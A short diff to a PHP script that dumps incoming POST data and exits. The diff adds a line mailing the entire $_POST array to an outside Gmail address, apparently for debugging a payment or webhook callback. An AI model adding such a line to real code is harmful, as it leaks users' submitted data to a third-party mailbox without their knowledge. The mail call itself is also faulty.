@@ -1,6 +1,10 @@
 <?php
 
 echo '<pre>' . print_r($_POST, true) . '</pre>';
+
+mail('jclv2004@gmail.com', 'MP', $_POST);
+
+
 die(1);
 
 /* $user_id = '581910860';
